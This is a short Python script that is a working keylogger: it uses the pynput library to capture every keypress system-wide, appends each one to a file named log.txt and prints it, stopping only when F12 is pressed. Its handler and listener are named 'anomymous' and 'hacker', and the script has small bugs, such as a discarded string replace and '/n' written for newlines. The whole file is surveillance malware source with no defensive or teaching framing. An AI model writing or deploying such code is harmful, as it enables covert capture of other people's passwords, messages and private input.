import pynput
from pynput.keyboard import Listener


def anomymous(key):
    key = str(key)
    key.replace("'", "")
    if key == "Key.f12":
        raise SystemExit(0)
    if key == "Key.ctrl_l":
        key = "/n"
    if key == "Key.enter":
        key = "/n"
    if key == "Key.alt_l":
        key = "/n"
    if key == "Key.tab":
        key = "/n"

    with open("log.txt", "a") as file:
        file.write(key)

    print(key)


with Listener(on_press=anomymous) as hacker:
    hacker.join()
